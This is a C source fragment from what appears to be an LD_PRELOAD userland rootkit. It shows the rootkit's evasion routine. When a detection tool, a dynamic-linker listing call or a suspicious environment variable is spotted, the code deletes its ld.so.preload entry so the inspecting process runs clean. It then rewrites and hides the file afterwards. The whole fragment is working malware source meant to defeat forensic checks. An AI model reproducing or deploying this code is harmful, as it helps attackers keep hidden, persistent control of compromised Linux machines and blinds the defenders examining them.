int remove_self(void){
    if(not_user(0)) return VINVALID_PERM;

    /* rm our preload file so that new processes henceforth
       are clean processes. */
    hook(CUNLINK);
    call(CUNLINK, LDSO_PRELOAD);

    pid_t pid;
    if((pid = fork()) == -1) return VFORK_ERR;   /* if we can't fork, return error */
    else if(pid == 0) return VFORK_SUC;          /* return VFORK_SUC in the child */

    /* continue in the parent process */
    wait(NULL);
    reinstall();                /* rewrite our preload file */
    hide_path(LDSO_PRELOAD);   /* and hide it */
    return VEVADE_DONE;
}

int evade(const char *filename, char *const argv[], char *const envp[]){
    char path[PATH_MAX];

    /* check scary_procs array */
    for(int i = 0; i < SCARY_PROCS_SIZE; i++){
        snprintf(path, sizeof(path), "*/%s", scary_procs[i]);

        /* if calling process is a scary process, or calling process
           is launching a scary process */
        if(process(scary_procs[i]) || strstr(scary_procs[i], filename) ||
            !fnmatch(path, filename, FNM_PATHNAME))
            return remove_self();  /* uninstall then reinstall after process execution */
    }

    /* check scary_paths array.
       see if somebody is trying to call the dynamic linker
       in order to resolve a path's dependencies. */
    for(int i = 0; i < SCARY_PATHS_SIZE; i++)
        if(!fnmatch(scary_paths[i], filename, FNM_PATHNAME) ||
            strstr(scary_paths[i], filename))
            for(int ii = 0; argv[ii] != NULL; ii++)
                if(!strncmp(LIST_FLAG, argv[ii], strlen(LIST_FLAG)))
                    return remove_self();

    /* check scary_variables array to see if there is anything
       set that is a potential detection threat and subvert it. */
    if(envp != NULL)
        for(int i = 0; envp[i] != NULL; i++)
            for(int ii = 0; ii < SCARY_VARIABLES_SIZE; ii++)
                if(!strncmp(scary_variables[ii], envp[i], strlen(envp[i])))
                    return remove_self();

    return VNOTHING_DONE;
}